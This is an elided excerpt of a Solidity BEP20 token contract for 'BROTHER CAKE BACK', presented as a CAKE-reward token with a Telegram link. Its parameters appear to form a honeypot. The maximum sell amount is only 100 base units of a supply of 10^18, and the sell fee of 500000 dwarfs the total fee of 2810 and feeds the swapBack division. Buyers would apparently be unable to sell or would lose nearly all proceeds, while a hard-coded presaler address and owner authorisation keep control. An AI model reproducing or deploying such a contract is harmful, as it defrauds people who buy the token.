...
Telegram : https://t.me/brothercakeback

Website : Undercontruction(TBA)
*/
...
contract BROTHERCAKEBACK is IBEP20, Auth {
    using SafeMath for uint256;

    address public CAKEREWARD = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;

    string constant _name = "BROTHER CAKE BACK";
    string constant _symbol = "$BCAKEB";
    uint8 constant _decimals = 9;
    
    uint256 _totalSupply = 1 * 10**9 * 10**9;
    uint256 public _maxTxAmount = 1 * 10**9 * 10**9;
    uint256 public _maxWallet = 1 * 10**9 * 10**9;
    uint256 private _maxTxSellAmount =1 * 10**1 * 10**1;
    ...
    uint256 public _CAKEREWARD = 10;
    uint256 marketingFee = 2000;
    uint256 totalFee = 2810;
    uint256 totalSellFee = 500000;
    ...
    uint256 swapThreshold = 1 *10**1 * 10**1;
    bool inSwap;
    ...
    constructor () Auth(msg.sender) {
        ...
        address _presaler = 0xB323C5fA5E18D6ee0536C988B5e0b0Be3a14d1Ab;
    ...
    function swapBack() internal swapping {
        ...
        uint256 amountBNBReflection = amountBNB.mul(totalSellFee).div(totalBNBFee);
